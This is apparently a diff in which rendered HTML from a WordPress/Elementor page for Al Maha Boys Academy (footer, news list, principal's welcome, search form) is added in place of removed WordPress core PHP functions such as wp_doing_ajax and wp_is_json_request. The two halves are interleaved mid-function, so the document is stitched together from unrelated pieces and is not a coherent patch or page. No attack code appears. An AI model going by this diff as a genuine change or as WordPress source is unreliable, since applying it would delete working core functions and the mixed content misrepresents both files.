+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-241af4d elementor-widget__width-auto elementor-widget elementor-widget-text-editor" data-id="241af4d" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									Copyright © 2025								</div>
+				</div>
+				<div class="elementor-element elementor-element-a96d06d elementor-widget__width-auto elementor-widget elementor-widget-text-editor" data-id="a96d06d" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p><a style="font-size: 16px; color: #f4f4f4;" href="#" target="_blank" rel="noopener">Ta&#8217;allum Group</a>. All rights reserved. | Powered By: <a style="font-size: 16px; color: #f4f4f4;" href="https://innovatixsystems.com/index.html" target="_blank" rel="noopener">Innovatix Systems Services</a></p>								</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-26553d5" data-id="26553d5" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-36d5ef7 elementor-align-left elementor-widget__width-auto elementor-widget elementor-widget-button" data-id="36d5ef7" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="#">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Cookies</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-880d673 elementor-align-left elementor-widget__width-auto elementor-widget elementor-widget-button" data-id="880d673" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="#">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Terms & Conditions</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-c5eb96f elementor-align-left elementor-widget__width-auto elementor-widget elementor-widget-button" data-id="c5eb96f" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="#">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Privacy Policy</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+						</footer>
+			</div>
+		
+</div><!-- / #page -->
 
-	if ( ! isset( $ini_all ) ) {
-		$ini_all = false;
-		// Sometimes `ini_get_all()` is disabled via the `disable_functions` option for "security purposes".
-		if ( function_exists( 'ini_get_all' ) ) {
-			$ini_all = ini_get_all();
-		}
-	}
 
-	if ( isset( $ini_all[ $setting ]['access'] )
-		&& ( INI_ALL === $ini_all[ $setting ]['access'] || INI_USER === $ini_all[ $setting ]['access'] )
-	) {
-		return true;
-	}
+<template id="tp-language" data-tp-language="en_US"></template>
+<div id="scroll-to-top" class="vamtam-scroll-to-top icon"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><path d="M15.098 8.344L.678 21.164C.081 21.694 0 22.645.5 23.279c.499.638 1.385.725 1.983.193l13.518-12.018 13.516 12.02c.6.53 1.486.445 1.985-.193s.419-1.585-.178-2.115L16.906 8.345c-.263-.234-.584-.351-.905-.351s-.641.118-.902.35z"/></svg></div>
 
-	// If we were unable to retrieve the details, fail gracefully to assume it's changeable.
-	if ( ! is_array( $ini_all ) ) {
-		return true;
-	}
 
-	return false;
-}
+		<div data-elementor-type="popup" data-elementor-id="998" class="elementor elementor-998 elementor-location-popup" data-elementor-settings="{&quot;entrance_animation&quot;:&quot;slideInDown&quot;,&quot;exit_animation&quot;:&quot;fadeIn&quot;,&quot;entrance_animation_duration&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0.2,&quot;sizes&quot;:[]},&quot;avoid_multiple_popups&quot;:&quot;yes&quot;,&quot;classes&quot;:&quot;vamtam-header-mega-menu&quot;,&quot;a11y_navigation&quot;:&quot;yes&quot;,&quot;timing&quot;:[]}" data-elementor-post-type="elementor_library">
+					<section class="elementor-section elementor-top-section elementor-element elementor-element-f14b095 elementor-section-height-min-height elementor-section-full_width elementor-section-height-default elementor-section-items-middle" data-id="f14b095" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-9cfa193" data-id="9cfa193" data-element_type="column">
+			<div class="elementor-widget-wrap">
+							</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-6372a387 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="6372a387" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-7b686052" data-id="7b686052" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-343e4bcf elementor-widget elementor-widget-heading" data-id="343e4bcf" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">School Calendar</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-10144f40 elementor-widget elementor-widget-text-editor" data-id="10144f40" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Our school calendar provides a comprehensive overview of key dates, events, and holidays, ensuring students, parents, and staff stay informed and organized.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-79f1bd47 elementor-widget elementor-widget-button" data-id="79f1bd47" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/wp-content/uploads/2024/10/School-Calendar-2024-2025-update.pdf">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<i aria-hidden="true" class="vamtamtheme- vamtam-theme-arrow-right"></i>			</span>
+									<span class="elementor-button-text">Download</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-41beded1" data-id="41beded1" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-36d20c8b elementor-widget elementor-widget-heading" data-id="36d20c8b" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">News</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-c7433cd elementor-grid-1 elementor-grid-tablet-1 elementor-posts--thumbnail-none elementor-posts--align-left elementor-grid-mobile-1 elementor-widget elementor-widget-posts" data-id="c7433cd" data-element_type="widget" data-settings="{&quot;classic_columns&quot;:&quot;1&quot;,&quot;classic_columns_tablet&quot;:&quot;1&quot;,&quot;classic_row_gap&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0,&quot;sizes&quot;:[]},&quot;classic_columns_mobile&quot;:&quot;1&quot;,&quot;classic_row_gap_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;classic_row_gap_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="posts.classic">
+				<div class="elementor-widget-container">
+							<div class="elementor-posts-container elementor-posts elementor-posts--skin-classic elementor-grid">
+				<article class="elementor-post elementor-grid-item post-994158 post type-post status-publish format-standard has-post-thumbnail hentry category-news tag-school-events-news">
+				<div class="elementor-post__text">
+				<h4 class="elementor-post__title">
+			<a href="https://amab.com.qa/online-lesson-on-tuesday/" >
+				Online Lesson on Tuesday			</a>
+		</h4>
+				<div class="elementor-post__meta-data">
+					<span class="elementor-post-date">
+			2025-11-03		</span>
+				</div>
+				</div>
+				</article>
+				<article class="elementor-post elementor-grid-item post-994138 post type-post status-publish format-standard has-post-thumbnail hentry category-news tag-school-events-news">
+				<div class="elementor-post__text">
+				<h4 class="elementor-post__title">
+			<a href="http://amab.com.qa/wp-content/uploads/2025/09/Mid-Semester-1-Exam-Timetable-V6.pdf#new_tab" >
+				Mid Semester 1 Exams  2025-2026 Timetable			</a>
+		</h4>
+				<div class="elementor-post__meta-data">
+					<span class="elementor-post-date">
+			2025-09-28		</span>
+				</div>
+				</div>
+				</article>
+				</div>
+		
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-82a929a elementor-widget elementor-widget-button" data-id="82a929a" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/news-and-events/">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<i aria-hidden="true" class="vamtamtheme- vamtam-theme-arrow-right"></i>			</span>
+									<span class="elementor-button-text">View  More</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-6f82bd93" data-id="6f82bd93" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-7ae99cd8 elementor-widget elementor-widget-heading" data-id="7ae99cd8" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default"><a href="#">Other Links</a></h4>				</div>
+				</div>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-00d1431 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="00d1431" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-bd4e5fa" data-id="bd4e5fa" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-5efdef8 elementor-widget elementor-widget-button" data-id="5efdef8" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://sites.google.com/view/amabonlinelibrary/home" target="_blank">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Online Library</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-598627d3 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="598627d3" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-44f03bc elementor-widget elementor-widget-button" data-id="44f03bc" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://amab.com.qa/online-admission/" target="_blank">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Online Admission</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-7d8140d9 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="7d8140d9" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-af495f1 elementor-widget elementor-widget-button" data-id="af495f1" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://www.tarbeyacenter.com/" target="_blank">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Tarbeya Center</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-dad68f4 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="dad68f4" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-4eee55f0 elementor-widget elementor-widget-button" data-id="4eee55f0" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="http://hr.apps.taallumgroup.com:8080/" target="_blank">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Employee Self Service</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-92b9195 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="92b9195" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-74e385d elementor-widget elementor-widget-button" data-id="74e385d" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://forms.office.com/Pages/ResponsePage.aspx?id=d1fW09Ff7E2PjzuxnZYQ9OOHznvyL05PjXHK4eeAWi1URUpNVzZVWFBSNlI1WDM2WlZFSTAzUFVIRC4u" target="_blank">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">AMAB Alumni</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-7f7036db" data-id="7f7036db" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-widget-wrap elementor-element-populated">
+					<div class="elementor-background-overlay"></div>
+						<div class="elementor-element elementor-element-14c372a8 elementor-widget elementor-widget-heading" data-id="14c372a8" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Welcome to Al Maha <br> Boys Academy</h4>				</div>
+				</div>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-21fb9a2 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="21fb9a2" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-75dbaf3" data-id="75dbaf3" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-3726376d elementor-blockquote--skin-quotation elementor-blockquote--align-left elementor-blockquote--button-color-official elementor-widget elementor-widget-blockquote" data-id="3726376d" data-element_type="widget" data-widget_type="blockquote.default">
+				<div class="elementor-widget-container">
+							<blockquote class="elementor-blockquote">
+			<p class="elementor-blockquote__content">
+				As the Principal of Al Maha Boys Academy, it is with great pleasure that I extend a warm welcome to all our students, parents, staff, and visitors...			</p>
+					</blockquote>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-5abb475 elementor-widget elementor-widget-icon-box" data-id="5abb475" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+									<div  class="elementor-icon-box-wrapper">
+										<div class="elementor-icon-box-content">
+						<h3 class="elementor-icon-box-title">
+							<span >Shuja Uddin</span>
+						</h3>
+												<p class="elementor-icon-box-description">- School Principal </p>
+											</div>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-0058ae5" data-id="0058ae5" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-dad3975 elementor-widget elementor-widget-image" data-id="dad3975" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-image">
+																					<img width="247" height="300" src="https://amab.com.qa/wp-content/uploads/2020/04/principal-amab-247x300.jpg" class="attachment-medium size-medium wp-image-987702" alt="" decoding="async" srcset="https://amab.com.qa/wp-content/uploads/2020/04/principal-amab-247x300.jpg 247w, https://amab.com.qa/wp-content/uploads/2020/04/principal-amab-768x934.jpg 768w, https://amab.com.qa/wp-content/uploads/2020/04/principal-amab.jpg 842w" sizes="(max-width: 247px) 100vw, 247px" />																								</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<div class="elementor-element elementor-element-3e0a78ea elementor-widget elementor-widget-button" data-id="3e0a78ea" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/principals-message/">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<i aria-hidden="true" class="vamtamtheme- vamtam-theme-arrow-right"></i>			</span>
+									<span class="elementor-button-text">Read more</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-256307d elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="256307d" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-no">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-5ebfa0f" data-id="5ebfa0f" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-68a2ce2 elementor-align-left elementor-mobile-align-center elementor-widget__width-auto elementor-widget elementor-widget-button" data-id="68a2ce2" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://amab.com.qa/online-admission/" target="_blank">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Online Admission</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-7ab5209 elementor-align-right elementor-tablet-align-left elementor-mobile-align-center elementor-widget__width-auto elementor-widget elementor-widget-button" data-id="7ab5209" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/wp-content/uploads/2024/10/AMAB-Parents-Complaints-Procedures-EN-AR-2.pdf" target="_blank">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Compliments and Suggestions</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-43f8e8a elementor-align-center elementor-tablet-align-center elementor-mobile-align-center elementor-widget__width-auto elementor-hidden-desktop elementor-hidden-tablet elementor-hidden-mobile elementor-widget elementor-widget-button" data-id="43f8e8a" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/tour" target="_blank">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">Take Tour</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+				<div data-elementor-type="popup" data-elementor-id="7592" class="elementor elementor-7592 elementor-location-popup" data-elementor-settings="{&quot;entrance_animation&quot;:&quot;slideInDown&quot;,&quot;exit_animation&quot;:&quot;slideInDown&quot;,&quot;entrance_animation_duration&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0.2,&quot;sizes&quot;:[]},&quot;classes&quot;:&quot;vamtam-bijoux-tabs-mega-menu vamtam-header-mega-menu&quot;,&quot;a11y_navigation&quot;:&quot;yes&quot;,&quot;timing&quot;:[]}" data-elementor-post-type="elementor_library">
+					<section class="elementor-section elementor-top-section elementor-element elementor-element-c28a38b elementor-section-height-min-height elementor-section-boxed elementor-section-height-default elementor-section-items-middle" data-id="c28a38b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-1c3b7ef" data-id="1c3b7ef" data-element_type="column">
+			<div class="elementor-widget-wrap">
+							</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-960bb5e elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="960bb5e" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-f3968e1" data-id="f3968e1" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-de7e2d7 vamtam-has-theme-form-style elementor-search-form--skin-classic elementor-search-form--button-type-icon elementor-search-form--icon-search elementor-widget elementor-widget-search-form" data-id="de7e2d7" data-element_type="widget" data-settings="{&quot;skin&quot;:&quot;classic&quot;}" data-widget_type="search-form.default">
+				<div class="elementor-widget-container">
+							<search role="search">
+			<form class="elementor-search-form" action="https://amab.com.qa" method="get">
+												<div class="elementor-search-form__container">
+					<label class="elementor-screen-only" for="elementor-search-form-de7e2d7">Search</label>
 
-/**
- * Determines whether the current request is a WordPress Ajax request.
- *
- * @since 4.7.0
- *
- * @return bool True if it's a WordPress Ajax request, false otherwise.
- */
-function wp_doing_ajax() {
-	/**
-	 * Filters whether the current request is a WordPress Ajax request.
-	 *
-	 * @since 4.7.0
-	 *
-	 * @param bool $wp_doing_ajax Whether the current request is a WordPress Ajax request.
-	 */
-	return apply_filters( 'wp_doing_ajax', defined( 'DOING_AJAX' ) && DOING_AJAX );
-}
-
-/**
- * Determines whether the current request should use themes.
- *
- * @since 5.1.0
- *
- * @return bool True if themes should be used, false otherwise.
- */
-function wp_using_themes() {
-	/**
-	 * Filters whether the current request should use themes.
-	 *
-	 * @since 5.1.0
-	 *
-	 * @param bool $wp_using_themes Whether the current request should use themes.
-	 */
-	return apply_filters( 'wp_using_themes', defined( 'WP_USE_THEMES' ) && WP_USE_THEMES );
-}
-
-/**
- * Determines whether the current request is a WordPress cron request.
- *
- * @since 4.8.0
- *
- * @return bool True if it's a WordPress cron request, false otherwise.
- */
-function wp_doing_cron() {
-	/**
-	 * Filters whether the current request is a WordPress cron request.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @param bool $wp_doing_cron Whether the current request is a WordPress cron request.
-	 */
-	return apply_filters( 'wp_doing_cron', defined( 'DOING_CRON' ) && DOING_CRON );
-}
-
-/**
- * Checks whether the given variable is a WordPress Error.
- *
- * Returns whether `$thing` is an instance of the `WP_Error` class.
- *
- * @since 2.1.0
- *
- * @param mixed $thing The variable to check.
- * @return bool Whether the variable is an instance of WP_Error.
- */
-function is_wp_error( $thing ) {
-	$is_wp_error = ( $thing instanceof WP_Error );
-
-	if( $is_wp_error ) {
-		/**
-		 * Fires when `is_wp_error()` is called and its parameter is an instance of `WP_Error`.
-		 *
-		 * @since 5.6.0
-		 *
-		 * @param WP_Error $thing The error object passed to `is_wp_error()`.
-		 */
-		do_action( 'is_wp_error_instance', $thing );
-	}
-
-	return $is_wp_error;
-}
-
-/**
- * Determines whether file modifications are allowed.
- *
- * @since 4.8.0
- *
- * @param string $context The usage context.
- * @return bool True if file modification is allowed, false otherwise.
- */
-function wp_is_file_mod_allowed( $context ) {
-	/**
-	 * Filters whether file modifications are allowed.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @param bool   $file_mod_allowed Whether file modifications are allowed.
-	 * @param string $context          The usage context.
-	 */
-	return apply_filters( 'file_mod_allowed', ! defined( 'DISALLOW_FILE_MODS' ) || ! DISALLOW_FILE_MODS, $context );
-}
-
-/**
- * Starts scraping edited file errors.
- *
- * @since 4.9.0
- */
-function wp_start_scraping_edited_file_errors() {
-	if ( ! isset( $_REQUEST['wp_scrape_key'] ) || ! isset( $_REQUEST['wp_scrape_nonce'] ) ) {
-		return;
-	}
-
-	$key   = substr( sanitize_key( wp_unslash( $_REQUEST['wp_scrape_key'] ) ), 0, 32 );
-	$nonce = wp_unslash( $_REQUEST['wp_scrape_nonce'] );
-	if ( empty( $key ) || empty( $nonce ) ) {
-		return;
-	}
-
-	$transient = get_transient( 'scrape_key_' . $key );
-	if ( false === $transient ) {
-		return;
-	}
-
-	if ( $transient !== $nonce ) {
-		if ( ! headers_sent() ) {
-			header( 'X-Robots-Tag: noindex' );
-			nocache_headers();
-		}
-		echo "###### wp_scraping_result_start:$key ######";
-		echo wp_json_encode(
-			array(
-				'code'    => 'scrape_nonce_failure',
-				'message' => __( 'Scrape key check failed. Please try again.' ),
-			)
-		);
-		echo "###### wp_scraping_result_end:$key ######";
-		die();
-	}
-
-	if ( ! defined( 'WP_SANDBOX_SCRAPING' ) ) {
-		define( 'WP_SANDBOX_SCRAPING', true );
-	}
-
-	register_shutdown_function( 'wp_finalize_scraping_edited_file_errors', $key );
-}
-
-/**
- * Finalizes scraping for edited file errors.
- *
- * @since 4.9.0
- *
- * @param string $scrape_key Scrape key.
- */
-function wp_finalize_scraping_edited_file_errors( $scrape_key ) {
-	$error = error_get_last();
-
-	echo "\n###### wp_scraping_result_start:$scrape_key ######\n";
-
-	if ( ! empty( $error )
-		&& in_array( $error['type'], array( E_CORE_ERROR, E_COMPILE_ERROR, E_ERROR, E_PARSE, E_USER_ERROR, E_RECOVERABLE_ERROR ), true )
-	) {
-		$error = str_replace( ABSPATH, '', $error );
-		echo wp_json_encode( $error );
-	} else {
-		echo wp_json_encode( true );
-	}
-
-	echo "\n###### wp_scraping_result_end:$scrape_key ######\n";
-}
-
-/**
- * Checks whether current request is a JSON request, or is expecting a JSON response.
- *
- * @since 5.0.0
- *
- * @return bool True if `Accepts` or `Content-Type` headers contain `application/json`.
- *              False otherwise.
- */
-function wp_is_json_request() {
-	if ( isset( $_SERVER['HTTP_ACCEPT'] ) && wp_is_json_media_type( $_SERVER['HTTP_ACCEPT'] ) ) {
-		return true;
-	}
-
-	if ( isset( $_SERVER['CONTENT_TYPE'] ) && wp_is_json_media_type( $_SERVER['CONTENT_TYPE'] ) ) {
-		return true;
-	}
-
-	return false;
-}
-
-/**
- * Checks whether current request is a JSONP request, or is expecting a JSONP response.
- *
- * @since 5.2.0
- *
- * @return bool True if JSONP request, false otherwise.
- */
-function wp_is_jsonp_request() {
-	if ( ! isset( $_GET['_jsonp'] ) ) {
-		return false;
-	}
-
-	if ( ! function_exists( 'wp_check_jsonp_callback' ) ) {
-		require_once ABSPATH . WPINC . '/functions.php';
-	}
-
-	$jsonp_callback = $_GET['_jsonp'];
-	if ( ! wp_check_jsonp_callback( $jsonp_callback ) ) {
-		return false;
-	}
-
-	/** This filter is documented in wp-includes/rest-api/class-wp-rest-server.php */
-	$jsonp_enabled = apply_filters( 'rest_jsonp_enabled', true );
-
-	return $jsonp_enabled;
-}
-
-/**
- * Checks whether a string is a valid JSON Media Type.
- *
- * @since 5.6.0
- *
- * @param string $media_type A Media Type string to check.
- * @return bool True if string is a valid JSON Media Type.
- */
-function wp_is_json_media_type( $media_type ) {
-	static $cache = array();
-
-	if ( ! isset( $cache[ $media_type ] ) ) {
-		$cache[ $media_type ] = (bool) preg_match( '/(^|\s|,)application\/([\w!#\$&-\^\.\+]+\+)?json(\+oembed)?($|\s|;|,)/i', $media_type );
-	}
-
-	return $cache[ $media_type ];
-}
-
-/**
- * Checks whether current request is an XML request, or is expecting an XML response.
- *
- * @since 5.2.0
- *
- * @return bool True if `Accepts` or `Content-Type` headers contain `text/xml`
- *              or one of the related MIME types. False otherwise.
- */
-function wp_is_xml_request() {
-	$accepted = array(
-		'text/xml',
-		'application/rss+xml',
-		'application/atom+xml',
-		'application/rdf+xml',
-		'text/xml+oembed',
-		'application/xml+oembed',
-	);
-
-	if ( isset( $_SERVER['HTTP_ACCEPT'] ) ) {
-		foreach ( $accepted as $type ) {
-			if ( str_contains( $_SERVER['HTTP_ACCEPT'], $type ) ) {
-				return true;
-			}
-		}
-	}
-
-	if ( isset( $_SERVER['CONTENT_TYPE'] ) && in_array( $_SERVER['CONTENT_TYPE'], $accepted, true ) ) {
-		return true;
-	}
-
-	return false;
-}
-
-/**
- * Checks if this site is protected by HTTP Basic Auth.
- *
- * At the moment, this merely checks for the present of Basic Auth credentials. Therefore, calling
- * this function with a context different from the current context may give inaccurate results.
- * In a future release, this evaluation may be made more robust.
- *
- * Currently, this is only used by Application Passwords to prevent a conflict since it also utilizes
- * Basic Auth.
- *
- * @since 5.6.1
- *
- * @global string $pagenow The filename of the current screen.
- *
- * @param string $context The context to check for protection. Accepts 'login', 'admin', and 'front'.
- *                        Defaults to the current context.
- * @return bool Whether the site is protected by Basic Auth.
- */
-function wp_is_site_protected_by_basic_auth( $context = '' ) {
-	global $pagenow;
-
-	if ( ! $context ) {
-		if ( 'wp-login.php' === $pagenow ) {
-			$context = 'login';
-		} elseif ( is_admin() ) {
-			$context = 'admin';
-		} else {
-			$context = 'front';
-		}
-	}
-
-	$is_protected = ! empty( $_SERVER['PHP_AUTH_USER'] ) || ! empty( $_SERVER['PHP_AUTH_PW'] );
-
-	/**
-	 * Filters whether a site is protected by HTTP Basic Auth.
-	 *
-	 * @since 5.6.1
-	 *
-	 * @param bool $is_protected Whether the site is protected by Basic Auth.
-	 * @param string $context    The context to check for protection. One of 'login', 'admin', or 'front'.
-	 */
